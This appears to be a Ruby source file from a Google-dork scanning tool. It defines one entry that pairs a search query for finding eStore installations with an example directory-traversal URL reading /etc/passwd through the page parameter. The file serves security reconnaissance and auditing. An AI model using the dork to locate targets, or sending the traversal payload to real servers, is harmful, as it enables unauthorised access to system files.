module Dorks
   class Dork1407 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1407",
            ghdb_url: "https://www.exploit-db.com/ghdb/1407",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-08-13",
            author: "anonymous",
            dork: <<~EDORK,
inurl:eStore/index.cgi?
EDORK
            description: <<~EDESC
this is for eStore directory traversal, example exploit:http://[target]/[path]/eStore/index.cgi?page=../../../../../../../../etc/passwd
EDESC
         })

      end
   end
end
